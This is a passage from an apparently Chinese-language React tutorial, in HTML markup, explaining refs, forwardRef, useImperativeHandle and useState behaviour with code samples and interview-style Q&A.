class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 错误用法：函数组件无实例</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">MyInput</span> = (<span class="hljs-params">&#123; value &#125;</span>) =&gt; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;value&#125;</span> /&gt;</span></span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>();<br>  <span class="hljs-comment">// 无效！inputRef.current 将为 null</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">MyInput</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputRef&#125;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>forwardRef 解决方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyInput</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">forwardRef</span>(<span class="hljs-function">(<span class="hljs-params">props, ref</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> &#123;<span class="hljs-attr">...props</span>&#125; <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;ref&#125;</span> /&gt;</span></span>;<br>&#125;);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>();  <span class="hljs-comment">// ✅ 现在可以操作 DOM</span><br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">MyInput</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputRef&#125;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>转发多个 ref</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MultiInput</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">forwardRef</span>(<span class="hljs-function">(<span class="hljs-params">props, ref</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> input1Ref = <span class="hljs-title function_">useRef</span>();<br>  <span class="hljs-keyword">const</span> input2Ref = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-comment">// 合并 ref 到父组件</span><br>  <span class="hljs-title function_">useImperativeHandle</span>(ref, <span class="hljs-function">() =&gt;</span> (&#123;<br>    <span class="hljs-attr">focusFirst</span>: <span class="hljs-function">() =&gt;</span> input1Ref.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>(),<br>    <span class="hljs-attr">focusSecond</span>: <span class="hljs-function">() =&gt;</span> input2Ref.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>()<br>  &#125;));<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;input1Ref&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;input2Ref&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;);<br><br><span class="hljs-comment">// 父组件使用</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> inputsRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">MultiInput</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputsRef&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> inputsRef.current.focusFirst()&#125;&gt;聚焦输入1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="useImperativeHandle-高级用法"><a href="#useImperativeHandle-高级用法" class="headerlink" title="useImperativeHandle 高级用法"></a>useImperativeHandle 高级用法</h3><p><strong>暴露自定义方法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">FancyInput</span> = <span class="hljs-title function_">forwardRef</span>(<span class="hljs-function">(<span class="hljs-params">props, ref</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-title function_">useImperativeHandle</span>(ref, <span class="hljs-function">() =&gt;</span> (&#123;<br>    <span class="hljs-comment">// 暴露特定方法</span><br>    <span class="hljs-attr">focus</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>      inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>();<br>    &#125;,<br>    <span class="hljs-attr">scrollIntoView</span>: <span class="hljs-function">() =&gt;</span> &#123;<br>      inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">scrollIntoView</span>();<br>    &#125;,<br>    <span class="hljs-comment">// 限制访问 DOM 节点</span><br>    <span class="hljs-attr">getValue</span>: <span class="hljs-function">() =&gt;</span> inputRef.<span class="hljs-property">current</span>.<span class="hljs-property">value</span><br>  &#125;));<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputRef&#125;</span> &#123;<span class="hljs-attr">...props</span>&#125; /&gt;</span></span>;<br>&#125;);<br><br><span class="hljs-comment">// 父组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">FancyInput</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputRef&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> inputRef.current.focus()&#125;&gt;聚焦<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> console.log(inputRef.current.getValue())&#125;&gt;获取值<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>依赖项控制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useImperativeHandle</span>(ref, <span class="hljs-function">() =&gt;</span> (&#123;<br>  <span class="hljs-comment">// 当 value 变化时更新方法</span><br>  <span class="hljs-attr">getValue</span>: <span class="hljs-function">() =&gt;</span> inputRef.<span class="hljs-property">current</span>.<span class="hljs-property">value</span><br>&#125;), [props.<span class="hljs-property">value</span>]);  <span class="hljs-comment">// 依赖项数组</span><br></code></pre></td></tr></table></figure><h3 id="高频面试题与破解方案-5"><a href="#高频面试题与破解方案-5" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q：为什么函数组件默认不能使用 ref？</strong></p><ul><li>函数组件无实例，ref 无法指向组件对象</li><li>React 设计哲学：避免直接操作子组件</li><li>解决方案：forwardRef + useImperativeHandle</li></ul><p><strong>Q：useRef 和 useState 有何区别？</strong></p><table><thead><tr><th align="left">特性</th><th align="left">useRef</th><th align="left">useState</th></tr></thead><tbody><tr><td align="left">触发重渲染</td><td align="left">否</td><td align="left">是</td></tr><tr><td align="left">存储值类型</td><td align="left">可变对象（.current）</td><td align="left">不可变状态</td></tr><tr><td align="left">数据持久化</td><td align="left">组件生命周期</td><td align="left">状态更新保留</td></tr><tr><td align="left">典型用途</td><td align="left">DOM 引用&#x2F;计时器 ID</td><td align="left">渲染相关状态</td></tr></tbody></table><p><strong>Q：回调 Ref 有何特殊用途？</strong></p><p>(1) 动态绑定：可在运行时切换 ref 目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;input ref=&#123;condition ? ref1 : ref2&#125; /&gt;<br></code></pre></td></tr></table></figure><p>(2) 精细控制：元素挂载&#x2F;卸载时执行逻辑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">measureRef</span> = (<span class="hljs-params">el</span>) =&gt; &#123;<br>  <span class="hljs-keyword">if</span> (el) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;尺寸:&#x27;</span>, el.<span class="hljs-title function_">getBoundingClientRect</span>());<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="总结：Refs-使用决策"><a href="#总结：Refs-使用决策" class="headerlink" title="总结：Refs 使用决策"></a>总结：Refs 使用决策</h3><pre class="mermaid">graph TD  A[是否需要操作 DOM?] -->|是| B[使用 Ref]  A -->|否| C[考虑 State]  B --> D{组件类型?}  D -->|函数组件| E[useRef + forwardRef]  D -->|类组件| F[createRef]  B --> G{需要暴露方法?}  G -->|是| H[useImperativeHandle]  G -->|否| I[直接访问 DOM]</pre><h1 id="第三章：Hooks-深度解析"><a href="#第三章：Hooks-深度解析" class="headerlink" title="第三章：Hooks 深度解析"></a>第三章：Hooks 深度解析</h1><h2 id="3-1-useState-与状态管理"><a href="#3-1-useState-与状态管理" class="headerlink" title="3.1 useState 与状态管理"></a>3.1 useState 与状态管理</h2><h3 id="基础概念概述-4"><a href="#基础概念概述-4" class="headerlink" title="基础概念概述"></a>基础概念概述</h3><p><strong>useState 作用</strong>：函数组件中添加状态能力的 Hook，替代类组件的 this.state</p><p>基本语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initialValue);<br></code></pre></td></tr></table></figure><ul><li>state：当前状态值</li><li>setState：状态更新函数</li><li>initialValue：初始状态（支持惰性初始化）</li></ul><h3 id="核心机制深度解析-2"><a href="#核心机制深度解析-2" class="headerlink" title="核心机制深度解析"></a>核心机制深度解析</h3><p><strong>闭包状态快照原理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>);   <span class="hljs-comment">// 闭包捕获当前 count 值</span><br>    <br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count);    <span class="hljs-comment">// 输出旧值（状态更新是异步的）</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;increment&#125;</span>&gt;</span>&#123;count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>关键特性：</p><ul><li>每次渲染都有独立的函数作用域</li><li>状态更新函数调用时使用当次渲染的快照值</li><li>状态更新触发重新渲染（生成新的闭包）</li></ul><p><strong>函数式更新解决闭包陷阱</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 闭包陷阱（连续点击只增加1）</span><br><span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>);<br><span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// ✅ 函数式更新（连续点击增加2）</span><br><span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);<br><span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>原理：更新函数接收 previous state 参数，React 保证这是最新状态</p><p><strong>状态批处理机制（React 18+）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c + <span class="hljs-number">1</span>);<br>  <span class="hljs-title function_">setFlag</span>(<span class="hljs-function"><span class="hljs-params">f</span> =&gt;</span> !f);<br>  <span class="hljs-comment">// React 18：自动批处理为单次渲染</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>事件循环中的表现：</p><pre class="mermaid">sequenceDiagram  participant UI as 用户界面  participant React as React 运行时  UI->>React: 触发事件  React->>React: 执行所有 setState  React->>React: 合并状态更新  React->>UI: 单次重渲染</pre><p><strong>惰性初始化（Lazy Initialization）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ✅ 避免重复计算初始值</span><br><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> initialState = <span class="hljs-title function_">computeExpensiveValue</span>(props);<br>  <span class="hljs-keyword">return</span> initialState;<br>&#125;);<br></code></pre></td></tr></table></figure><ul><li>初始化函数仅在挂载时执行一次</li><li>避免重新渲染时重复计算</li></ul><h3 id="状态管理进阶模式"><a href="#状态管理进阶模式" class="headerlink" title="状态管理进阶模式"></a>状态管理进阶模式</h3><p><strong>状态依赖更新</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// 当 count 变化时重置 page</span><br>  <span class="hljs-title function_">setPage</span>(<span class="hljs-number">1</span>);<br>&#125;, [count]); <span class="hljs-comment">// 依赖项触发状态重置</span><br></code></pre></td></tr></table></figure><p><strong>状态提升与下沉策略</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 状态提升：共享状态到共同祖先</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [sharedState, setSharedState] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ChildA</span> <span class="hljs-attr">state</span>=<span class="hljs-string">&#123;sharedState&#125;</span> <span class="hljs-attr">setState</span>=<span class="hljs-string">&#123;setSharedState&#125;</span> /&gt;</span></span><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ChildB</span> <span class="hljs-attr">state</span>=<span class="hljs-string">&#123;sharedState&#125;</span> <span class="hljs-attr">setState</span>=<span class="hljs-string">&#123;setSharedState&#125;</span> /&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 状态下沉：缩小状态影响范围</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Component</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 只有按钮依赖 count</span><br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ExpensiveComponent</span> /&gt;</span></span><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">count</span>=<span class="hljs-string">&#123;count&#125;</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(c =&gt; c + 1)&#125; /&gt;</span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>状态合并模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 方案1：使用对象</span><br><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">flag</span>: <span class="hljs-literal">false</span> &#125;);<br><span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123; ...prev, <span class="hljs-attr">count</span>: prev.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;));<br><br><span class="hljs-comment">// 方案2：多个 useState</span><br><span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">const</span> [flag, setFlag] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">// 方案3：useReducer（复杂状态）</span><br><span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, &#123; <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">flag</span>: <span class="hljs-literal">false</span> &#125;);<br></code></pre></td></tr></table></figure><h3 id="高频面试题与破解方案-6"><a href="#高频面试题与破解方案-6" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q：为什么连续调用 setState 不更新？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>); <span class="hljs-comment">// 本次渲染 count=0</span><br>  <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>); <span class="hljs-comment">// 本次渲染 count=0</span><br>  <span class="hljs-comment">// 结果：count 只增加1</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>闭包捕获的 count 是当次渲染的固定值，解决方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ✅ 函数式更新</span><br><span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);<br><span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><strong>Q：useState 和 useRef 存储数据有何区别？</strong></p><table><thead><tr><th align="left">特性</th><th align="left">useState</th><th align="left">useRef</th></tr></thead><tbody><tr><td align="left">触发重渲染</td><td align="left">是</td><td align="left">否</td></tr><tr><td align="left">数据持久化</td><td align="left">跨渲染保留</td><td align="left">跨渲染保留</td></tr><tr><td align="left">数据访问</td><td align="left">直接使用 state</td><td align="left">通过 .current 访问</td></tr><tr><td align="left">更新方式</td><td align="left">setState 函数</td><td align="left">直接修改 .current</td></tr><tr><td align="left">典型用途</td><td align="left">驱动 UI 变化的状态</td><td align="left">DOM 引用&#x2F;不触发渲染的值</td></tr></tbody></table><p><strong>Q：如何实现状态重置？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> initialUser = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;John&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> &#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Profile</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>(initialUser);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">reset</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-comment">// ✅ 正确：重置为初始值</span><br>    <span class="hljs-title function_">setUser</span>(initialUser);<br>    <br>    <span class="hljs-comment">// ❌ 危险：可能导致引用问题</span><br>    <span class="hljs-comment">// setUser(&#123; name: &#x27;John&#x27;, age: 30 &#125;);</span><br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="性能优化技巧-1"><a href="#性能优化技巧-1" class="headerlink" title="性能优化技巧"></a>性能优化技巧</h3><p><strong>避免不必要状态</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 冗余状态（可从 props 派生）</span><br><span class="hljs-keyword">const</span> [fullName, setFullName] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;name&#125;</span> <span class="hljs-subst">$&#123;surname&#125;</span>`</span>);<br><br><span class="hljs-comment">// ✅ 直接用计算值</span><br><span class="hljs-keyword">const</span> fullName = <span class="hljs-string">`<span class="hljs-subst">$&#123;name&#125;</span> <span class="hljs-subst">$&#123;surname&#125;</span>`</span>;<br></code></pre></td></tr></table></figure><p><strong>状态隔离减少重渲染</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 原始结构：状态变化导致整个组件重渲染</span><br><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(&#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: <span class="hljs-number">2</span> &#125;);<br><br><span class="hljs-comment">// 优化方案：拆分为独立状态</span><br><span class="hljs-keyword">const</span> [a, setA] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">const</span> [b, setB] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p><strong>状态记忆化</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-comment">// ✅ 避免子组件不必要重渲染</span><br>  <span class="hljs-keyword">const</span> child = <span class="hljs-title function_">useMemo</span>(<br>    <span class="hljs-function">() =&gt;</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ExpensiveChild</span> <span class="hljs-attr">count</span>=<span class="hljs-string">&#123;count&#125;</span> /&gt;</span></span>,<br>    [count] <span class="hljs-comment">// 仅 count 变化时更新</span><br>  );<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;child&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="与类组件状态对比"><a href="#与类组件状态对比" class="headerlink" title="与类组件状态对比"></a>与类组件状态对比</h3><table><thead><tr><th align="left">特性</th><th align="left">useState</th><th align="left">this.state</th></tr></thead><tbody><tr><td align="left">更新方式</td><td align="left">独立 set 函数</td><td align="left">this.setState({})</td></tr><tr><td align="left">状态合并</td><td align="left">不自动合并</td><td align="left">自动浅合并</td></tr><tr><td align="left">异步行为</td><td 